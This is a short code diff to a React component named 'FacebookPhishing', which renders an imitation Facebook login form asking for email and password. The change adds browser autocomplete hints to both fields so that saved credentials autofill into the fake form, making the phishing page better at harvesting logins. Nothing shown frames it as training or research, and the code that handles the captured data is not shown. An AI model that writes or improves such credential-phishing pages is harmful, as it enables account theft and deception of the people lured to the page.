@@ -46,6 +46,7 @@ export default function FacebookPhishing() {
             onChange={e => setEmail(e.target.value)}
             className="fb-input"
             required
+            autoComplete="username"
           />
           <input
             type="password"
@@ -54,6 +55,7 @@ export default function FacebookPhishing() {
             onChange={e => setSenha(e.target.value)}
             className="fb-input"
             required
+            autoComplete="current-password"
           />
           <button type="submit" className="fb-btn">Log In</button>
           <div className="fb-links">
